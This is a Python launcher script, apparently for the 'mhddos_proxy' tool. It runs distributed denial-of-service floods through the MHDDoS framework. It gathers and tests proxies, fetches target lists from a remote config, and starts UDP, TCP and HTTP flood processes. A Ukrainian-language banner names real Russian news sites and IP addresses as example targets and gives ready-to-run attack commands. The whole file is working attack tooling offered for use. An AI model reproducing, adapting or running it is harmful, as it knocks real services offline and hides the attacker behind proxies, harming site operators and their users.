import argparse
import json
import multiprocessing
import os
import random
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from MHDDoS.start import ProxyManager, logger
from PyRoxy import ProxyType, Proxy


PROXY_TIMEOUT = 5
UDP_THREADS = 1

HIGH_THREADS = 5000
LOW_RPC = 1000


class Targets:
    def __init__(self, targets, config):
        self.targets = targets
        self.config = config
        self.config_targets = []

    def __iter__(self):
        self.load_config()
        for target in self.targets + self.config_targets:
            yield self.prepare_target(target)

    def prepare_target(self, target):
        if '://' in target:
            return target

        try:
            _, port = target.split(':', 1)
        except ValueError:
            port = '80'

        scheme = 'https://' if port == '443' else 'http://'
        return scheme + target

    def load_config(self):
        if not self.config:
            return

        try:
            config_content = requests.get(self.config, timeout=5).text
        except requests.RequestException:
            logger.warning('Could not load new config, proceeding with the last known good one')
        else:
            self.config_targets = [
                target.strip()
                for target in config_content.split()
                if target.strip()
            ]


def remove_duplicates(proxies):
    proxy_tuples = (
        (proxy.host, proxy.port, proxy.type)
        for proxy in proxies
    )
    return [Proxy(*pargs) for pargs in set(proxy_tuples)]


def update_proxies(period, targets, total_threads):
    #  Avoid parsing proxies too often when restart happens
    if os.path.exists('files/proxies/proxies.txt'):
        last_update = os.path.getmtime('files/proxies/proxies.txt')
        if (time.time() - last_update) < period / 2:
            return

    with open('../proxies_config.json') as f:
        config = json.load(f)

    Proxies = remove_duplicates(ProxyManager.DownloadFromConfig(config, 0))
    random.shuffle(Proxies)

    size = len(targets)
    logger.info(f'{len(Proxies):,} проксі перевіряється на працездатність - це може зайняти пару хвилин:')

    future_to_proxy = {}
    with ThreadPoolExecutor(min(1000, total_threads)) as executor:
        for target, chunk in zip(targets, (Proxies[i::size] for i in range(size))):
            future_to_proxy.update({
                executor.submit(proxy.check, target, PROXY_TIMEOUT): proxy
                for proxy in chunk
            })

        CheckedProxies = [
            future_to_proxy[future]
            for future in as_completed(future_to_proxy) if future.result()
        ]

    if not CheckedProxies:
        logger.error(
            'Не знайдено робочих проксі. '
            'Переконайтеся що інтернет з`єднання стабільне і ціль доступна. '
            'Перезапустіть Docker.'
        )
        exit()

    os.makedirs('files/proxies/', exist_ok=True)
    with open('files/proxies/proxies.txt', "w") as all_wr, \
            open('files/proxies/socks4.txt', "w") as socks4_wr, \
            open('files/proxies/socks5.txt', "w") as socks5_wr:
        for proxy in CheckedProxies:
            proxy_string = str(proxy) + "\n"
            all_wr.write(proxy_string)
            if proxy.type == ProxyType.SOCKS4:
                socks4_wr.write(proxy_string)
            if proxy.type == ProxyType.SOCKS5:
                socks5_wr.write(proxy_string)


def run_ddos(targets, total_threads, period, rpc, http_methods, debug):
    threads_per_target = total_threads // len(targets)
    params_list = []
    for target in targets:
        # UDP
        if target.lower().startswith('udp://'):
            logger.warning(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
            params_list.append([
                'UDP', target[6:], str(UDP_THREADS), str(period)
            ])

        # TCP
        elif target.lower().startswith('tcp://'):
            for socks_type, socks_file in (('4', 'socks4.txt'), ('5', 'socks5.txt')):
                params_list.append([
                    'TCP', target[6:], str(threads_per_target // 2), str(period), socks_type, socks_file
                ])

        # HTTP(S)
        else:
            method = random.choice(http_methods)
            params_list.append([
                method, target, '0', str(threads_per_target), 'proxies.txt', str(rpc), str(period)
            ])

    processes = []
    for params in params_list:
        if debug:
            params.append('true')
        processes.append(
            subprocess.Popen([sys.executable, './start.py', *params])
        )

    for p in processes:
        p.wait()


def start(total_threads, period, targets, rpc, http_methods, debug):
    os.chdir('MHDDoS')
    while True:
        resolved = list(targets)
        if not resolved:
            logger.error('Must provide either targets or a valid config file')
            exit()

        if total_threads > HIGH_THREADS:
            logger.warning(
                f'Загальна кількість потоків перевищує {HIGH_THREADS}. '
                f'Це може призвести до перевантаження системи та/або падіння продуктивності.'
            )

        if rpc < LOW_RPC:
            logger.warning(
                f'RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
                f'через збільшення кількості перемикань кожного потоку між проксі.'
            )

        no_proxies = all(target.lower().startswith('udp://') for target in resolved)
        if not no_proxies:
            update_proxies(period, resolved, total_threads)
        run_ddos(resolved, total_threads, period, rpc, http_methods, debug)


def init_argparse() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'targets',
        nargs='*',
        help='List of targets, separated by spaces',
    )
    parser.add_argument(
        '-c',
        '--config',
        help='URL to a config file',
    )
    parser.add_argument(
        '-t',
        '--threads',
        type=int,
        default=300,
        help='Threads per CPU Core (default is 300)',
    )
    parser.add_argument(
        '-p',
        '--period',
        type=int,
        default=900,
        help='How often to update the proxies (in seconds) (default is 900)',
    )
    parser.add_argument(
        '--rpc',
        type=int,
        default=2000,
        help='How many requests to send on a single proxy connection (default is 2000)',
    )
    parser.add_argument(
        '--debug',
        action='store_true',
        default=False,
        help='Enable debug output from MHDDoS',
    )
    parser.add_argument(
        '--http-methods',
        nargs='+',
        default=['GET', 'POST', 'STRESS', 'BOT', 'PPS'],
        help='List of HTTP(s) attack methods to use. Default is GET, POST, STRESS, BOT, PPS',
    )
    return parser


def print_banner():
    print('''\
                            !!!ВИМКНІТЬ VPN!!!  (окрім UDP атак)
     (скрипт автоматично підбирає проксі, VPN тільки заважає як додатковий прошарок)
# Варіанти цілей
- URL         https://ria.ru
- IP + PORT   5.188.56.124:3606
- TCP         tcp://194.54.14.131:22
- UDP         udp://217.175.155.100:53 - !!!ДЛЯ ЦЬОГО ПОТРІБЕН VPN!!!
# Конфігурація. Усі параметри можна комбінувати, можна вказувати і до і після переліку цілей.
Для Docker замініть `python3 runner.py` на `docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest`
- Повна документація - `python3 runner.py --help` 
- Навантаження - `-t XXX` - кількість потоків на кожне ядро CPU, за замовчуванням - 300
    python3 runner.py -t 500 https://ria.ru https://tass.ru
- Інформація про хід атаки - прапорець `--debug`
    python3 runner.py --debug https://ria.ru https://tass.ru
- Частота оновлення проксі (за замовчуванням - кожні 15 хвилин) - `-p SECONDS`
    python3 runner.py -p 1200 https://ria.ru https://tass.ru
                          !!!ВИМКНІТЬ VPN!!!  (окрім UDP атак)
    ''')


if __name__ == '__main__':
    args = init_argparse().parse_args()
    print_banner()
    start(
        args.threads * multiprocessing.cpu_count(),
        args.period,
        Targets(args.targets, args.config),
        args.rpc,
        args.http_methods,
        args.debug,
    )
